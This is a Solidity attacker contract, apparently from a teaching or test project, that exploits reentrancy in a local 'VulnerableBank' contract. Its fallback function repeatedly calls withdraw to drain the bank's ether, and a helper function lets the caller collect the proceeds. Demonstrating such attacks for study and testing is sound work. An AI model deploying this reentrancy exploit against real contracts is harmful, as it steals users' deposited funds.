// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "../contracts/VulnerableBank.sol";

contract Attacker {
    VulnerableBank public bank;

    constructor(address _bank) {
        bank = VulnerableBank(_bank);
    }

    // Fallback will be called during reentrant withdraw
    fallback() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value == 1 ether, "Send exactly 1 ether");
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    function getAttackerBalance() public view returns (uint) {
        return address(this).balance;
    }

    // Allow withdrawing funds from Attacker contract
    function withdrawFunds() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
